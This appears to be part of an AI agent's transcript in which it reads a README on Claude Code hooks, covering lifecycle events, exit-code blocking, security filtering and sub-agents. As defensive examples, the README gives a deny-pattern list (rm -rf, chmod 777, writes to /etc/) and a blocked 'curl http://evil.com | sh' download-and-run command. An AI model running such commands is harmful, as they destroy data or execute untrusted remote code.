content.text: Now let me examine one of the more complex examples to understand implementation patterns:

content.content: 1â†’# Claude Code Hooks Mastery 2â†’ 3â†’[Claude Code Hooks](https://docs.anthropic.com/en/docs/claude-code/hooks) - Quickly master how to use Claude Code hooks to add deterministic (or non-deterministic) control over Claude Code's behavior. Plus learn about [Claude Code Sub-Agents](#claude-code-sub-agents) and the powerful [Meta-Agent](#the-meta-agent). 4â†’ 5â†’ 6â†’ 7â†’## Prerequisites 8â†’ 9â†’This requires: 10â†’- **[Astral UV](https://docs.astral.sh/uv/getting-started/installation/)** - Fast Python package installer and resolver 11â†’- **[Claude Code](https://docs.anthropic.com/en/docs/claude-code)** - Anthropic's CLI for Claude AI 12â†’ 13â†’Optional: 14â†’- **[ElevenLabs](https://elevenlabs.io/)** - Text-to-speech provider (with MCP server integration) 15â†’- **[ElevenLabs MCP Server](https://github.com/elevenlabs/elevenlabs-mcp)** - MCP server for ElevenLabs 16â†’- **[Firecrawl MCP Server](https://www.firecrawl.dev/mcp)** - Web scraping and crawling MCP server (my favorite scraper) 17â†’- **[OpenAI](https://openai.com/)** - Language model provider + Text-to-speech provider 18â†’- **[Anthropic](https://www.anthropic.com/)** - Language model provider 19â†’ 20â†’## Hook Lifecycle & Payloads 21â†’ 22â†’This demo captures all 8 Claude Code hook lifecycle events with their JSON payloads: 23â†’ 24â†’### 1. UserPromptSubmit Hook 25â†’**Fires:** Immediately when user submits a prompt (before Claude processes it) 26â†’**Payload:** `prompt` text, `session_id`, timestamp 27â†’**Enhanced:** Prompt validation, logging, context injection, security filtering 28â†’ 29â†’### 2. PreToolUse Hook 30â†’**Fires:** Before any tool execution 31â†’**Payload:** `tool_name`, `tool_input` parameters 32â†’**Enhanced:** Blocks dangerous commands (`rm -rf`, `.env` access) 33â†’ 34â†’### 3. PostToolUse Hook 35â†’**Fires:** After successful tool completion 36â†’**Payload:** `tool_name`, `tool_input`, `tool_response` with results 37â†’ 38â†’### 4. Notification Hook 39â†’**Fires:** When Claude Code sends notifications (waiting for input, etc.) 40â†’**Payload:** `message` content 41â†’**Enhanced:** TTS alerts - "Your agent needs your input" (30% chance includes name) 42â†’ 43â†’### 5. Stop Hook 44â†’**Fires:** When Claude Code finishes responding 45â†’**Payload:** `stop_hook_active` boolean flag 46â†’**Enhanced:** AI-generated completion messages with TTS playback 47â†’ 48â†’### 6. SubagentStop Hook 49â†’**Fires:** When Claude Code subagents (Task tools) finish responding 50â†’**Payload:** `stop_hook_active` boolean flag 51â†’**Enhanced:** TTS playback - "Subagent Complete" 52â†’ 53â†’### 7. PreCompact Hook 54â†’**Fires:** Before Claude Code performs a compaction operation 55â†’**Payload:** `trigger` ("manual" or "auto"), `custom_instructions` (for manual), session info 56â†’**Enhanced:** Transcript backup, verbose feedback for manual compaction 57â†’ 58â†’### 8. SessionStart Hook 59â†’**Fires:** When Claude Code starts a new session or resumes an existing one 60â†’**Payload:** `source` ("startup", "resume", or "clear"), session info 61â†’**Enhanced:** Development context loading (git status, recent issues, context files) 62â†’ 63â†’## What This Shows 64â†’ 65â†’- **Complete hook lifecycle coverage** - All 8 hook events implemented and logging 66â†’- **Prompt-level control** - UserPromptSubmit validates and enhances prompts before Claude sees them 67â†’- **Intelligent TTS system** - AI-generated audio feedback with voice priority (ElevenLabs > OpenAI > pyttsx3) 68â†’- **Security enhancements** - Blocks dangerous commands and sensitive file access at multiple levels 69â†’- **Personalized experience** - Uses engineer name from environment variables 70â†’- **Automatic logging** - All hook events are logged as JSON to `logs/` directory 71â†’- **Chat transcript extraction** - PostToolUse hook converts JSONL transcripts to readable JSON format 72â†’ 73â†’> **Warning:** The `chat.json` file contains only the most recent Claude Code conversation. It does not preserve conversations from previous sessions - each new conversation is fully copied and overwrites the previous one. This is unlike the other logs which are appended to from every claude code session. 74â†’ 75â†’## UV Single-File Scripts Architecture 76â†’ 77â†’This project leverages **[UV single-file scripts](https://docs.astral.sh/uv/guides/scripts/)** to keep hook logic cleanly separated from your main codebase. All hooks live in `.claude/hooks/` as standalone Python scripts with embedded dependency declarations. 78â†’ 79â†’**Benefits:** 80â†’- **Isolation** - Hook logic stays separate from your project dependencies 81â†’- **Portability** - Each hook script declares its own dependencies inline 82â†’- **No Virtual Environment Management** - UV handles dependencies automatically 83â†’- **Fast Execution** - UV's dependency resolution is lightning-fast 84â†’- **Self-Contained** - Each hook can be understood and modified independently 85â†’ 86â†’This approach ensures your hooks remain functional across different environments without polluting your main project's dependency tree. 87â†’ 88â†’## Key Files 89â†’ 90â†’- `.claude/settings.json` - Hook configuration with permissions 91â†’- `.claude/hooks/` - Python scripts using uv for each hook type 92â†’ - `user_prompt_submit.py` - Prompt validation, logging, and context injection 93â†’ - `pre_tool_use.py` - Security blocking and logging 94â†’ - `post_tool_use.py` - Logging and transcript conversion 95â†’ - `notification.py` - Logging with optional TTS (--notify flag) 96â†’ - `stop.py` - AI-generated completion messages with TTS 97â†’ - `subagent_stop.py` - Simple "Subagent Complete" TTS 98â†’ - `pre_compact.py` - Transcript backup and compaction logging 99â†’ - `session_start.py` - Development context loading and session logging 100â†’ - `utils/` - Intelligent TTS and LLM utility scripts 101â†’ - `tts/` - Text-to-speech providers (ElevenLabs, OpenAI, pyttsx3) 102â†’ - `llm/` - Language model integrations (OpenAI, Anthropic) 103â†’- `logs/` - JSON logs of all hook executions 104â†’ - `user_prompt_submit.json` - User prompt submissions with validation 105â†’ - `pre_tool_use.json` - Tool use events with security blocking 106â†’ - `post_tool_use.json` - Tool completion events 107â†’ - `notification.json` - Notification events 108â†’ - `stop.json` - Stop events with completion messages 109â†’ - `subagent_stop.json` - Subagent completion events 110â†’ - `pre_compact.json` - Pre-compaction events with trigger type 111â†’ - `session_start.json` - Session start events with source type 112â†’ - `chat.json` - Readable conversation transcript (generated by --chat flag) 113â†’- `ai_docs/cc_hooks_docs.md` - Complete hooks documentation from Anthropic 114â†’- `ai_docs/user_prompt_submit_hook.md` - Comprehensive UserPromptSubmit hook documentation 115â†’ 116â†’Hooks provide deterministic control over Claude Code behavior without relying on LLM decisions. 117â†’ 118â†’## Features Demonstrated 119â†’ 120â†’- Prompt validation and security filtering 121â†’- Context injection for enhanced AI responses 122â†’- Command logging and auditing 123â†’- Automatic transcript conversion 124â†’- Permission-based tool access control 125â†’- Error handling in hook execution 126â†’ 127â†’Run any Claude Code command to see hooks in action via the `logs/` files. 128â†’ 129â†’## Hook Error Codes & Flow Control 130â†’ 131â†’Claude Code hooks provide powerful mechanisms to control execution flow and provide feedback through exit codes and structured JSON output. 132â†’ 133â†’### Exit Code Behavior 134â†’ 135â†’Hooks communicate status and control flow through exit codes: 136â†’ 137â†’| Exit Code | Behavior | Description | 138â†’| --------- | ------------------ | -------------------------------------------------------------------------------------------- | 139â†’| **0** | Success | Hook executed successfully. `stdout` shown to user in transcript mode (Ctrl-R) | 140â†’| **2** | Blocking Error | **Critical**: `stderr` is fed back to Claude automatically. See hook-specific behavior below | 141â†’| **Other** | Non-blocking Error | `stderr` shown to user, execution continues normally | 142â†’ 143â†’### Hook-Specific Flow Control 144â†’ 145â†’Each hook type has different capabilities for blocking and controlling Claude Code's behavior: 146â†’ 147â†’#### UserPromptSubmit Hook - **CAN BLOCK PROMPTS & ADD CONTEXT** 148â†’- **Primary Control Point**: Intercepts user prompts before Claude processes them 149â†’- **Exit Code 2 Behavior**: Blocks the prompt entirely, shows error message to user 150â†’- **Use Cases**: Prompt validation, security filtering, context injection, audit logging 151â†’- **Example**: Our `user_prompt_submit.py` logs all prompts and can validate them 152â†’ 153â†’#### PreToolUse Hook - **CAN BLOCK TOOL EXECUTION** 154â†’- **Primary Control Point**: Intercepts tool calls before they execute 155â†’- **Exit Code 2 Behavior**: Blocks the tool call entirely, shows error message to Claude 156â†’- **Use Cases**: Security validation, parameter checking, dangerous command prevention 157â†’- **Example**: Our `pre_tool_use.py` blocks `rm -rf` commands with exit code 2 158â†’ 159â†’```python 160â†’# Block dangerous commands 161â†’if is_dangerous_rm_command(command): 162â†’ print("BLOCKED: Dangerous rm command detected", file=sys.stderr) 163â†’ sys.exit(2) # Blocks tool call, shows error to Claude 164â†’``` 165â†’ 166â†’#### PostToolUse Hook - **CANNOT BLOCK (Tool Already Executed)** 167â†’- **Primary Control Point**: Provides feedback after tool completion 168â†’- **Exit Code 2 Behavior**: Shows error to Claude (tool already ran, cannot be undone) 169â†’- **Use Cases**: Validation of results, formatting, cleanup, logging 170â†’- **Limitation**: Cannot prevent tool execution since it fires after completion 171â†’ 172â†’#### Notification Hook - **CANNOT BLOCK** 173â†’- **Primary Control Point**: Handles Claude Code notifications 174â†’- **Exit Code 2 Behavior**: N/A - shows stderr to user only, no blocking capability 175â†’- **Use Cases**: Custom notifications, logging, user alerts 176â†’- **Limitation**: Cannot control Claude Code behavior, purely informational 177â†’ 178â†’#### Stop Hook - **CAN BLOCK STOPPING** 179â†’- **Primary Control Point**: Intercepts when Claude Code tries to finish responding 180â†’- **Exit Code 2 Behavior**: Blocks stoppage, shows error to Claude (forces continuation) 181â†’- **Use Cases**: Ensuring tasks complete, validation of final state use this to FORCE CONTINUATION 182â†’- **Caution**: Can cause infinite loops if not properly controlled 183â†’ 184â†’#### SubagentStop Hook - **CAN BLOCK SUBAGENT STOPPING** 185â†’- **Primary Control Point**: Intercepts when Claude Code subagents try to finish 186â†’- **Exit Code 2 Behavior**: Blocks subagent stoppage, shows error to subagent 187â†’- **Use Cases**: Ensuring subagent tasks complete properly 188â†’- **Example**: Our `subagent_stop.py` logs events and announces completion 189â†’ 190â†’#### PreCompact Hook - **CANNOT BLOCK** 191â†’- **Primary Control Point**: Fires before compaction operations 192â†’- **Exit Code 2 Behavior**: N/A - shows stderr to user only, no blocking capability 193â†’- **Use Cases**: Transcript backup, context preservation, pre-compaction logging 194â†’- **Example**: Our `pre_compact.py` creates transcript backups before compaction 195â†’ 196â†’#### SessionStart Hook - **CANNOT BLOCK** 197â†’- **Primary Control Point**: Fires when new sessions start or resume 198â†’- **Exit Code 2 Behavior**: N/A - shows stderr to user only, no blocking capability 199â†’- **Use Cases**: Loading development context, session initialization, environment setup 200â†’- **Example**: Our `session_start.py` loads git status, recent issues, and context files 201â†’ 202â†’### Advanced JSON Output Control 203â†’ 204â†’Beyond simple exit codes, hooks can return structured JSON for sophisticated control: 205â†’ 206â†’#### Common JSON Fields (All Hook Types) 207â†’```json 208â†’{ 209â†’ "continue": true, // Whether Claude should continue (default: true) 210â†’ "stopReason": "string", // Message when continue=false (shown to user) 211â†’ "suppressOutput": true // Hide stdout from transcript (default: false) 212â†’} 213â†’``` 214â†’ 215â†’#### PreToolUse Decision Control 216â†’```json 217â†’{ 218â†’ "decision": "approve" | "block" | undefined, 219â†’ "reason": "Explanation for decision" 220â†’} 221â†’``` 222â†’ 223â†’- **"approve"**: Bypasses permission system, `reason` shown to user 224â†’- **"block"**: Prevents tool execution, `reason` shown to Claude 225â†’- **undefined**: Normal permission flow, `reason` ignored 226â†’ 227â†’#### PostToolUse Decision Control 228â†’```json 229â†’{ 230â†’ "decision": "block" | undefined, 231â†’ "reason": "Explanation for decision" 232â†’} 233â†’``` 234â†’ 235â†’- **"block"**: Automatically prompts Claude with `reason` 236â†’- **undefined**: No action, `reason` ignored 237â†’ 238â†’#### Stop Decision Control 239â†’```json 240â†’{ 241â†’ "decision": "block" | undefined, 242â†’ "reason": "Must be provided when blocking Claude from stopping" 243â†’} 244â†’``` 245â†’ 246â†’- **"block"**: Prevents Claude from stopping, `reason` tells Claude how to proceed 247â†’- **undefined**: Allows normal stopping, `reason` ignored 248â†’ 249â†’### Flow Control Priority 250â†’ 251â†’When multiple control mechanisms are used, they follow this priority: 252â†’ 253â†’1. **`"continue": false`** - Takes precedence over all other controls 254â†’2. **`"decision": "block"`** - Hook-specific blocking behavior 255â†’3. **Exit Code 2** - Simple blocking via stderr 256â†’4. **Other Exit Codes** - Non-blocking errors 257â†’ 258â†’### Security Implementation Examples 259â†’ 260â†’#### 1. Command Validation (PreToolUse) 261â†’```python 262â†’# Block dangerous patterns 263â†’dangerous_patterns = [ 264â†’ r'rm\s+.*-[rf]', # rm -rf variants 265â†’ r'sudo\s+rm', # sudo rm commands 266â†’ r'chmod\s+777', # Dangerous permissions 267â†’ r'>\s*/etc/', # Writing to system directories 268â†’] 269â†’ 270â†’for pattern in dangerous_patterns: 271â†’ if re.search(pattern, command, re.IGNORECASE): 272â†’ print(f"BLOCKED: {pattern} detected", file=sys.stderr) 273â†’ sys.exit(2) 274â†’``` 275â†’ 276â†’#### 2. Result Validation (PostToolUse) 277â†’```python 278â†’# Validate file operations 279â†’if tool_name == "Write" and not tool_response.get("success"): 280â†’ output = { 281â†’ "decision": "block", 282â†’ "reason": "File write operation failed, please check permissions and retry" 283â†’ } 284â†’ print(json.dumps(output)) 285â†’ sys.exit(0) 286â†’``` 287â†’ 288â†’#### 3. Completion Validation (Stop Hook) 289â†’```python 290â†’# Ensure critical tasks are complete 291â†’if not all_tests_passed(): 292â†’ output = { 293â†’ "decision": "block", 294â†’ "reason": "Tests are failing. Please fix failing tests before completing." 295â†’ } 296â†’ print(json.dumps(output)) 297â†’ sys.exit(0) 298â†’``` 299â†’ 300â†’### Hook Execution Environment 301â†’ 302â†’- **Timeout**: 60-second execution limit per hook 303â†’- **Parallelization**: All matching hooks run in parallel 304â†’- **Environment**: Inherits Claude Code's environment variables 305â†’- **Working Directory**: Runs in current project directory 306â†’- **Input**: JSON via stdin with session and tool data 307â†’- **Output**: Processed via stdout/stderr with exit codes 308â†’ 309â†’## UserPromptSubmit Hook Deep Dive 310â†’ 311â†’The UserPromptSubmit hook is the first line of defense and enhancement for Claude Code interactions. It fires immediately when you submit a prompt, before Claude even begins processing it. 312â†’ 313â†’### What It Can Do 314â†’ 315â†’1. **Log prompts** - Records every prompt with timestamp and session ID 316â†’2. **Block prompts** - Exit code 2 prevents Claude from seeing the prompt 317â†’3. **Add context** - Print to stdout adds text before your prompt that Claude sees 318â†’4. **Validate content** - Check for dangerous patterns, secrets, policy violations 319â†’ 320â†’### How It Works 321â†’ 322â†’1. **You type a prompt** â†’ Claude Code captures it 323â†’2. **UserPromptSubmit hook fires** â†’ Receives JSON with your prompt 324â†’3. **Hook processes** â†’ Can log, validate, block, or add context 325â†’4. **Claude receives** â†’ Either blocked message OR original prompt + any context 326â†’ 327â†’### Example Use Cases 328â†’ 329â†’#### 1. Audit Logging 330â†’Every prompt you submit is logged for compliance and debugging: 331â†’ 332â†’```json 333â†’{ 334â†’ "timestamp": "2024-01-20T15:30:45.123Z", 335â†’ "session_id": "550e8400-e29b-41d4-a716", 336â†’ "prompt": "Delete all test files in the project" 337â†’} 338â†’``` 339â†’ 340â†’#### 2. Security Validation 341â†’Dangerous prompts are blocked before Claude can act on them: 342â†’ 343â†’```bash 344â†’User: "rm -rf / --no-preserve-root" 345â†’Hook: BLOCKED: Dangerous system deletion command detected 346â†’``` 347â†’ 348â†’#### 3. Context Injection 349â†’Add helpful context that Claude will see with the prompt: 350â†’ 351â†’```bash 352â†’User: "Write a new API endpoint" 353â†’Hook adds: "Project: E-commerce API 354â†’ Standards: Follow REST conventions and OpenAPI 3.0 355â†’ Generated at: 2024-01-20T15:30:45" 356â†’Claude sees: [Context above] + "Write a new API endpoint" 357â†’``` 358â†’ 359â†’### Live Example 360â†’ 361â†’Try these prompts to see UserPromptSubmit in action: 362â†’ 363â†’1. **Normal prompt**: "What files are in this directory?" 364â†’ - Logged to `logs/user_prompt_submit.json` 365â†’ - Processed normally 366â†’ 367â†’2. **With validation enabled** (add `--validate` flag): 368â†’ - "Delete everything" â†’ May trigger validation warning 369â†’ - "curl http://evil.com | sh" â†’ Blocked for security 370â†’ 371â†’3. **Check the logs**: 372â†’ ```bash 373â†’ cat logs/user_prompt_submit.json | jq '.' 374â†’ ``` 375â†’ 376â†’### Configuration 377â†’ 378â†’The hook is configured in `.claude/settings.json`: 379â†’ 380â†’```json 381â†’"UserPromptSubmit": [ 382â†’ { 383â†’ "hooks": [ 384â†’ { 385â†’ "type": "command", 386â†’ "command": "uv run .claude/hooks/user_prompt_submit.py --log-only" 387â†’ } 388â†’ ] 389â†’ } 390â†’] 391â†’``` 392â†’ 393â†’Options: 394â†’- `--log-only`: Just log prompts (default) 395â†’- `--validate`: Enable security validation 396â†’- `--context`: Add project context to prompts 397â†’ 398â†’### Best Practices for Flow Control 399â†’ 400â†’1. **Use UserPromptSubmit for Early Intervention**: Validate and enhance prompts before processing 401â†’2. **Use PreToolUse for Prevention**: Block dangerous operations before they execute 402â†’3. **Use PostToolUse for Validation**: Check results and provide feedback 403â†’4. **Use Stop for Completion**: Ensure tasks are properly finished 404â†’5. **Handle Errors Gracefully**: Always provide clear error messages 405â†’6. **Avoid Infinite Loops**: Check `stop_hook_active` flag in Stop hooks 406â†’7. **Test Thoroughly**: Verify hooks work correctly in safe environments 407â†’ 408â†’## Claude Code Sub-Agents 409â†’ 410â†’> Watch [this YouTube video](https://youtu.be/7B2HJr0Y68g) to see how to create and use Claude Code sub-agents effectively. 411â†’> 412â†’> See the [Claude Code Sub-Agents documentation](https://docs.anthropic.com/en/docs/claude-code/sub-agents) for more details. 413â†’ 414â†’ 415â†’ 416â†’Claude Code supports specialized sub-agents that handle specific tasks with custom system prompts, tools, and separate context windows. Sub-agents are AI assistants that your primary Claude Code agent can delegate tasks to. 417â†’ 418â†’### Understanding Sub-Agents: System Prompts, Not User Prompts 419â†’ 420â†’**Critical Concept**: The content in agent files (`.claude/agents/*.md`) are **system prompts** that configure the sub-agent's behavior. They are NOT user prompts. This is the #1 misunderstanding when creating agents. 421â†’ 422â†’**Information Flow**: 423â†’``` 424â†’You (User) â†’ Primary Agent â†’ Sub-Agent â†’ Primary Agent â†’ You (User) 425â†’``` 426â†’ 427â†’ 428â†’ 429â†’1. **You** make a request to Claude Code (primary agent) 430â†’2. **Primary Agent** analyzes your request and delegates to appropriate sub-agent 431â†’3. **Sub-Agent** executes task using its system prompt instructions 432â†’4. **Sub-Agent** reports results back to primary agent 433â†’5. **Primary Agent** synthesizes and presents results to you 434â†’ 435â†’**Key Points**: 436â†’- Sub-agents NEVER communicate directly with you 437â†’- Sub-agents start fresh with no conversation history 438â†’- Sub-agents respond to the primary agent's prompt, not yours 439â†’- The `description` field tells the primary agent WHEN to use the sub-agent 440â†’ 441â†’### Agent Storage & Organization 442â†’ 443â†’This repository demonstrates various agent configurations: 444â†’ 445â†’**Project Agents** (`.claude/agents/`): 446â†’``` 447â†’.claude/agents/ 448â†’â”œâ”€â”€ crypto/ # Cryptocurrency analysis agents 449â†’â”‚ â”œâ”€â”€ crypto-coin-analyzer-haiku.md 450â†’â”‚ â”œâ”€â”€ crypto-coin-analyzer-opus.md 451â†’â”‚ â”œâ”€â”€ crypto-coin-analyzer-sonnet.md 452â†’â”‚ â”œâ”€â”€ crypto-investment-plays-*.md 453â†’â”‚ â”œâ”€â”€ crypto-market-agent-*.md 454â†’â”‚ â”œâ”€â”€ crypto-movers-haiku.md 455â†’â”‚ â””â”€â”€ macro-crypto-correlation-scanner-*.md 456â†’â”œâ”€â”€ hello-world-agent.md # Simple greeting agent 457â†’â”œâ”€â”€ llm-ai-agents-and-eng-research.md # AI research specialist 458â†’â”œâ”€â”€ meta-agent.md # Agent that creates agents 459â†’â””â”€â”€ work-completion-summary.md # Audio summary generator 460â†’``` 461â†’ 462â†’**Storage Hierarchy**: 463â†’- **Project agents**: `.claude/agents/` (higher priority, project-specific) 464â†’- **User agents**: `~/.claude/agents/` (lower priority, available across all projects) 465â†’- **Format**: Markdown files with YAML frontmatter 466â†’ 467â†’**Agent File Structure:** 468â†’```yaml 469â†’--- 470â†’name: agent-name 471â†’description: When to use this agent (critical for automatic delegation) 472â†’tools: Tool1, Tool2, Tool3 # Optional - inherits all tools if omitted 473â†’color: Cyan # Visual identifier in terminal 474â†’model: opus # Optional - haiku | sonnet | opus - defaults to sonnet 475â†’--- 476â†’ 477â†’# Purpose 478â†’You are a [role definition]. 479â†’ 480â†’## Instructions 481â†’1. Step-by-step instructions 482â†’2. What the agent should do 483â†’3. How to report results 484â†’ 485â†’## Report/Response Format 486â†’Specify how the agent should communicate results back to the primary agent. 487â†’``` 488â†’ 489â†’Sub-agents enable: 490â†’- **Task specialization** - Code reviewers, debuggers, test runners 491â†’- **Context preservation** - Each agent operates independently 492â†’- **Tool restrictions** - Grant only necessary permissions 493â†’- **Automatic delegation** - Claude proactively uses the right agent 494â†’ 495â†’### Key Engineering Insights 496â†’ 497â†’**Two Critical Mistakes to Avoid:** 498â†’ 499â†’1. **Misunderstanding the System Prompt** - What you write in agent files is the *system prompt*, not a user prompt. This changes how you structure instructions and what information is available to the agent. 500â†’ 501â†’2. **Ignoring Information Flow** - Sub-agents respond to your primary agent, not to you. Your primary agent prompts sub-agents based on your original request, and sub-agents report back to the primary agent, which then reports to you. 502â†’ 503â†’**Best Practices:** 504â†’- Use the `description` field to tell your primary agent *when* and *how* to prompt sub-agents 505â†’- Include phrases like "use PROACTIVELY" or trigger words (e.g., "if they say TTS") in descriptions 506â†’- Remember sub-agents start fresh with no context - be explicit about what they need to know 507â†’- Follow Problem â†’ Solution â†’ Technology approach when building agents 508â†’ 509â†’### Complex Workflows & Agent Chaining 510â†’ 511â†’Claude Code can intelligently chain multiple sub-agents together for complex tasks: 512â†’ 513â†’ 514â†’ 515â†’For example: 516â†’- "First analyze the market with crypto-market-agent, then use crypto-investment-plays to find opportunities" 517â†’- "Use the debugger agent to fix errors, then have the code-reviewer check the changes" 518â†’- "Generate a new agent with meta-agent, then test it on a specific task" 519â†’ 520â†’This chaining allows you to build sophisticated workflows while maintaining clean separation of concerns. 521â†’ 522â†’### The Meta-Agent 523â†’ 524â†’The meta-agent (`.claude/agents/meta-agent.md`) is a specialized sub-agent that generates new sub-agents from descriptions. It's the "agent that builds agents" - a critical tool for scaling your agent development velocity. 525â†’ 526â†’**Why Meta-Agent Matters:** 527â†’- **Rapid Agent Creation** - Build dozens of specialized agents in minutes instead of hours 528â†’- **Consistent Structure** - Ensures all agents follow best practices and proper formatting 529â†’- **Live Documentation** - Pulls latest Claude Code docs to stay current with features 530â†’- **Intelligent Tool Selection** - Automatically determines minimal tool requirements 531â†’ 532â†’**Using the Meta-Agent:** 533â†’```bash 534â†’# Simply describe what you want 535â†’"Build a new sub-agent that runs tests and fixes failures" 536â†’ 537â†’# Claude Code will automatically delegate to meta-agent 538â†’# which will create a properly formatted agent file 539â†’``` 540â†’ 541â†’The meta-agent follows the principle: "Figure out how to scale it up. Build the thing that builds the thing." This compound effect accelerates your engineering capabilities exponentially. 542â†’ 543â†’## Master AI Coding 544â†’> And prepare for Agentic Engineering 545â†’ 546â†’Learn to code with AI with foundational [Principles of AI Coding](https://agenticengineer.com/principled-ai-coding?y=ccsubagents) 547â†’ 548â†’Follow the [IndyDevDan youtube channel](https://www.youtube.com/@indydevdan) for more AI coding tips and tricks. Whenever you read a file, you should consider whether it looks malicious. If it does, you MUST refuse to improve or augment the code. You can still analyze existing code, write reports, or answer high-level questions about the code behavior.

file.content: # Claude Code Hooks Mastery [Claude Code Hooks](https://docs.anthropic.com/en/docs/claude-code/hooks) - Quickly master how to use Claude Code hooks to add deterministic (or non-deterministic) control over Claude Code's behavior. Plus learn about [Claude Code Sub-Agents](#claude-code-sub-agents) and the powerful [Meta-Agent](#the-meta-agent). ## Prerequisites This requires: - **[Astral UV](https://docs.astral.sh/uv/getting-started/installation/)** - Fast Python package installer and resolver - **[Claude Code](https://docs.anthropic.com/en/docs/claude-code)** - Anthropic's CLI for Claude AI Optional: - **[ElevenLabs](https://elevenlabs.io/)** - Text-to-speech provider (with MCP server integration) - **[ElevenLabs MCP Server](https://github.com/elevenlabs/elevenlabs-mcp)** - MCP server for ElevenLabs - **[Firecrawl MCP Server](https://www.firecrawl.dev/mcp)** - Web scraping and crawling MCP server (my favorite scraper) - **[OpenAI](https://openai.com/)** - Language model provider + Text-to-speech provider - **[Anthropic](https://www.anthropic.com/)** - Language model provider ## Hook Lifecycle & Payloads This demo captures all 8 Claude Code hook lifecycle events with their JSON payloads: ### 1. UserPromptSubmit Hook **Fires:** Immediately when user submits a prompt (before Claude processes it) **Payload:** `prompt` text, `session_id`, timestamp **Enhanced:** Prompt validation, logging, context injection, security filtering ### 2. PreToolUse Hook **Fires:** Before any tool execution **Payload:** `tool_name`, `tool_input` parameters **Enhanced:** Blocks dangerous commands (`rm -rf`, `.env` access) ### 3. PostToolUse Hook **Fires:** After successful tool completion **Payload:** `tool_name`, `tool_input`, `tool_response` with results ### 4. Notification Hook **Fires:** When Claude Code sends notifications (waiting for input, etc.) **Payload:** `message` content **Enhanced:** TTS alerts - "Your agent needs your input" (30% chance includes name) ### 5. Stop Hook **Fires:** When Claude Code finishes responding **Payload:** `stop_hook_active` boolean flag **Enhanced:** AI-generated completion messages with TTS playback ### 6. SubagentStop Hook **Fires:** When Claude Code subagents (Task tools) finish responding **Payload:** `stop_hook_active` boolean flag **Enhanced:** TTS playback - "Subagent Complete" ### 7. PreCompact Hook **Fires:** Before Claude Code performs a compaction operation **Payload:** `trigger` ("manual" or "auto"), `custom_instructions` (for manual), session info **Enhanced:** Transcript backup, verbose feedback for manual compaction ### 8. SessionStart Hook **Fires:** When Claude Code starts a new session or resumes an existing one **Payload:** `source` ("startup", "resume", or "clear"), session info **Enhanced:** Development context loading (git status, recent issues, context files) ## What This Shows - **Complete hook lifecycle coverage** - All 8 hook events implemented and logging - **Prompt-level control** - UserPromptSubmit validates and enhances prompts before Claude sees them - **Intelligent TTS system** - AI-generated audio feedback with voice priority (ElevenLabs > OpenAI > pyttsx3) - **Security enhancements** - Blocks dangerous commands and sensitive file access at multiple levels - **Personalized experience** - Uses engineer name from environment variables - **Automatic logging** - All hook events are logged as JSON to `logs/` directory - **Chat transcript extraction** - PostToolUse hook converts JSONL transcripts to readable JSON format > **Warning:** The `chat.json` file contains only the most recent Claude Code conversation. It does not preserve conversations from previous sessions - each new conversation is fully copied and overwrites the previous one. This is unlike the other logs which are appended to from every claude code session. ## UV Single-File Scripts Architecture This project leverages **[UV single-file scripts](https://docs.astral.sh/uv/guides/scripts/)** to keep hook logic cleanly separated from your main codebase. All hooks live in `.claude/hooks/` as standalone Python scripts with embedded dependency declarations. **Benefits:** - **Isolation** - Hook logic stays separate from your project dependencies - **Portability** - Each hook script declares its own dependencies inline - **No Virtual Environment Management** - UV handles dependencies automatically - **Fast Execution** - UV's dependency resolution is lightning-fast - **Self-Contained** - Each hook can be understood and modified independently This approach ensures your hooks remain functional across different environments without polluting your main project's dependency tree. ## Key Files - `.claude/settings.json` - Hook configuration with permissions - `.claude/hooks/` - Python scripts using uv for each hook type - `user_prompt_submit.py` - Prompt validation, logging, and context injection - `pre_tool_use.py` - Security blocking and logging - `post_tool_use.py` - Logging and transcript conversion - `notification.py` - Logging with optional TTS (--notify flag) - `stop.py` - AI-generated completion messages with TTS - `subagent_stop.py` - Simple "Subagent Complete" TTS - `pre_compact.py` - Transcript backup and compaction logging - `session_start.py` - Development context loading and session logging - `utils/` - Intelligent TTS and LLM utility scripts - `tts/` - Text-to-speech providers (ElevenLabs, OpenAI, pyttsx3) - `llm/` - Language model integrations (OpenAI, Anthropic) - `logs/` - JSON logs of all hook executions - `user_prompt_submit.json` - User prompt submissions with validation - `pre_tool_use.json` - Tool use events with security blocking - `post_tool_use.json` - Tool completion events - `notification.json` - Notification events - `stop.json` - Stop events with completion messages - `subagent_stop.json` - Subagent completion events - `pre_compact.json` - Pre-compaction events with trigger type - `session_start.json` - Session start events with source type - `chat.json` - Readable conversation transcript (generated by --chat flag) - `ai_docs/cc_hooks_docs.md` - Complete hooks documentation from Anthropic - `ai_docs/user_prompt_submit_hook.md` - Comprehensive UserPromptSubmit hook documentation Hooks provide deterministic control over Claude Code behavior without relying on LLM decisions. ## Features Demonstrated - Prompt validation and security filtering - Context injection for enhanced AI responses - Command logging and auditing - Automatic transcript conversion - Permission-based tool access control - Error handling in hook execution Run any Claude Code command to see hooks in action via the `logs/` files. ## Hook Error Codes & Flow Control Claude Code hooks provide powerful mechanisms to control execution flow and provide feedback through exit codes and structured JSON output. ### Exit Code Behavior Hooks communicate status and control flow through exit codes: | Exit Code | Behavior | Description | | --------- | ------------------ | -------------------------------------------------------------------------------------------- | | **0** | Success | Hook executed successfully. `stdout` shown to user in transcript mode (Ctrl-R) | | **2** | Blocking Error | **Critical**: `stderr` is fed back to Claude automatically. See hook-specific behavior below | | **Other** | Non-blocking Error | `stderr` shown to user, execution continues normally | ### Hook-Specific Flow Control Each hook type has different capabilities for blocking and controlling Claude Code's behavior: #### UserPromptSubmit Hook - **CAN BLOCK PROMPTS & ADD CONTEXT** - **Primary Control Point**: Intercepts user prompts before Claude processes them - **Exit Code 2 Behavior**: Blocks the prompt entirely, shows error message to user - **Use Cases**: Prompt validation, security filtering, context injection, audit logging - **Example**: Our `user_prompt_submit.py` logs all prompts and can validate them #### PreToolUse Hook - **CAN BLOCK TOOL EXECUTION** - **Primary Control Point**: Intercepts tool calls before they execute - **Exit Code 2 Behavior**: Blocks the tool call entirely, shows error message to Claude - **Use Cases**: Security validation, parameter checking, dangerous command prevention - **Example**: Our `pre_tool_use.py` blocks `rm -rf` commands with exit code 2 ```python # Block dangerous commands if is_dangerous_rm_command(command): print("BLOCKED: Dangerous rm command detected", file=sys.stderr) sys.exit(2) # Blocks tool call, shows error to Claude ``` #### PostToolUse Hook - **CANNOT BLOCK (Tool Already Executed)** - **Primary Control Point**: Provides feedback after tool completion - **Exit Code 2 Behavior**: Shows error to Claude (tool already ran, cannot be undone) - **Use Cases**: Validation of results, formatting, cleanup, logging - **Limitation**: Cannot prevent tool execution since it 